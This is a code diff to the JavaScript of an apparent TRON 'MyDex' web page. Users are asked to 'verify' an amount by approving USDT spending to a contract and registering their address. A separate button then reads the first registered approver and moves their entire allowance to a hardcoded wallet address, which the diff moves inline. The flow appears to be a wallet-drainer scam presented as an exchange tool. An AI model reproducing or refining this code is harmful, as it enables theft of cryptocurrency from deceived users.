@@ -56,65 +56,6 @@
 
     const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
     const MyDex_contractAddress = "TWKeZLCX7b6xnyhL9PyFhkA7A8ezkQRWsF";
-    const receiverAddress = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
-
-    const TRC20_ABI = [
-      {
-        constant: false,
-        inputs: [
-          { name: "_spender", type: "address" },
-          { name: "_value", type: "uint256" }
-        ],
-        name: "approve",
-        outputs: [{ name: "", type: "bool" }],
-        type: "function"
-      },
-      {
-        constant: true,
-        inputs: [
-          { name: "_owner", type: "address" },
-          { name: "_spender", type: "address" }
-        ],
-        name: "allowance",
-        outputs: [{ name: "remaining", type: "uint256" }],
-        type: "function"
-      },
-      {
-        constant: true,
-        inputs: [{ name: "_owner", type: "address" }],
-        name: "balanceOf",
-        outputs: [{ name: "balance", type: "uint256" }],
-        type: "function"
-      }
-    ];
-
-    const MyDex_ABI = [
-      {
-        inputs: [{ internalType: "address", name: "user", type: "address" }],
-        name: "addAddress",
-        outputs: [],
-        stateMutability: "nonpayable",
-        type: "function"
-      },
-      {
-        inputs: [{ internalType: "uint256", name: "index", type: "uint256" }],
-        name: "getIndexAddress",
-        outputs: [{ internalType: "address", name: "", type: "address" }],
-        stateMutability: "view",
-        type: "function"
-      },
-      {
-        inputs: [
-          { internalType: "address", name: "from", type: "address" },
-          { internalType: "address", name: "to", type: "address" },
-          { internalType: "uint256", name: "amount", type: "uint256" }
-        ],
-        name: "transferFrom",
-        outputs: [{ internalType: "bool", name: "", type: "bool" }],
-        stateMutability: "nonpayable",
-        type: "function"
-      }
-    ];
 
     connectButton.onclick = async () => {
       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
@@ -131,50 +72,55 @@
         solidityNode: await window.tronWeb.isConnected("solidityNode"),
         eventServer: await window.tronWeb.isConnected("eventServer"),
       };
-      alert("節點狀態：\n" + JSON.stringify(status, null, 2));
+      alert(`節點狀態：
+FullNode: ${status.fullNode}
+SolidityNode: ${status.solidityNode}
+EventServer: ${status.eventServer}`);
     };
 
     approveButton.onclick = async () => {
       try {
+        if (!window.tronWeb || !window.tronWeb.contract) {
+          return alert("不支援的錢包瀏覽器，請使用 TronLink");
+        }
+
         const amountStr = verifyAmountInput.value.trim();
         if (!amountStr) return alert("請輸入金額");
+
         const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
         const userAddress = window.tronWeb.defaultAddress.base58;
 
-        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
-        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
 
-        const tx1 = await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
-        console.log("授權成功:", tx1);
-
-        const tx2 = await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
-        console.log("加入成功:", tx2);
+        await USDT.approve(MyDex_contractAddress, amount).send({ feeLimit: 100_000_000 });
+        await MyDex.addAddress(userAddress).send({ feeLimit: 100_000_000 });
 
         alert("✅ 授權與加入成功");
       } catch (err) {
-        console.error("授權失敗:", err);
+        console.error("❌ 授權錯誤：", err);
         alert("❌ 授權失敗：" + (err.message || "未知錯誤"));
       }
     };
 
     transferFromButton.onclick = async () => {
       try {
-        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
-        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
 
         const fromHex = await MyDex.getIndexAddress(0).call();
         const from = window.tronWeb.address.fromHex(fromHex);
+        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
 
         const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
         const amount = window.tronWeb.toBigNumber(allowance).toString();
 
-        if (BigInt(amount) === 0n) return alert("尚未授權或授權為 0");
+        if (BigInt(amount) === 0n) return alert("尚未授權或金額為 0");
 
-        const tx = await MyDex.transferFrom(from, receiverAddress, amount).send({ feeLimit: 100_000_000 });
-        console.log("轉帳成功:", tx);
+        const tx = await MyDex.transferFrom(from, to, amount).send({ feeLimit: 100_000_000 });
         alert("✅ 轉帳成功！交易 ID：" + tx);
       } catch (err) {
-        console.error("轉帳錯誤:", err);
+        console.error("❌ 轉帳失敗：", err);
         alert("❌ 轉帳失敗：" + (err.message || "未知錯誤"));
       }
     };
@@ -182,19 +128,21 @@
     checkBtn.onclick = async () => {
       try {
         const userAddress = window.tronWeb.defaultAddress.base58;
-        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
         const balance = await USDT.balanceOf(userAddress).call();
         const allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();
-        alert(`錢包地址：${userAddress}\nUSDT 餘額：${balance / 1e6}\n授權額度：${allowance / 1e6}`);
+        alert(`錢包地址：${userAddress}
+USDT 餘額：${balance / 1e6}
+授權額度：${allowance / 1e6}`);
       } catch (err) {
-        console.error("查詢錯誤:", err);
+        console.error("❌ 查詢錯誤：", err);
         alert("❌ 查詢失敗：" + (err.message || "未知錯誤"));
       }
     };
 
     showUsersBtn.onclick = async () => {
       try {
-        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
         const first = await MyDex.getIndexAddress(0).call();
         const addr = window.tronWeb.address.fromHex(first);
         alert("第一位授權者地址：" + addr);
